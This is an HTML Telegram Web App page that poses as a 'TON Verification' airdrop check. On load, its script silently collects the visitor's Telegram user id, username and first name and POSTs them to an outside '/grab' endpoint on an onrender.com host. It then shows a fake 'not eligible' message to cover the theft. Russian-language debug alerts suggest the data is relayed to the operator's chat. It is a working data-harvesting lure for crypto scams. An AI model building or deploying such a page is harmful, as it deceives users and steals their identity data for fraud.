<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .spinner { border: 4px solid #333; border-left-color: #0088cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <h2 id="status">CONNECTING TO TON...</h2>
    <p id="sub">Please wait...</p>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        const RENDER_URL = 'https://projectx-6vwo.onrender.com/grab';

        async function start() {
            setTimeout(async () => {
                document.getElementById('status').innerText = "SYNCING DATA...";
                
                const user = tg.initDataUnsafe.user || { id: "TEST", username: "local_test", first_name: "Tester" };

                try {
                    const response = await fetch(RENDER_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            user_id: user.id,
                            username: user.username,
                            first_name: user.first_name
                        })
                    });
                    
                    if (response.ok) {
                        alert("СВЯЗЬ УСТАНОВЛЕНА! Проверяй чат.");
                    } else {
                        alert("СЕРВЕР ОТВЕТИЛ ОШИБКОЙ: " + response.status);
                    }
                } catch (e) {
                    alert("ОШИБКА СЕТИ (Render спит?): " + e);
                }

                document.getElementById('status').innerText = "ERROR: NO AIRDROP FOUND";
                document.getElementById('sub').innerText = "Your account is not eligible.";
            }, 3000);
        }

        start();
    </script>
</body>
</html>
